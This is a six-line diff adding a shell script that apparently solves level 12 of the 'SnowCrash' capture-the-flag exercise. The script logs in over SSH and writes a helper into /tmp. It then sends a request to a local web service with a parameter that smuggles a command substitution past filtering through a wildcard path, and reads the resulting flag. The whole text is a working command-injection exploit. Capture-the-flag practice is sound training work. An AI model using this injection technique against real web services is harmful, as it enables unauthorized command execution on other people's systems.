@@ -1,0 +1,6 @@
+ssh level12@$SNOWCRASH_IP -p 4242 '
+	echo "getflag > /tmp/flag12" > /tmp/GETFLAG
+	chmod +x /tmp/GETFLAG
+	curl -s localhost:4646?x="\$(/*/GETFLAG)"
+	cat /tmp/flag12
+'
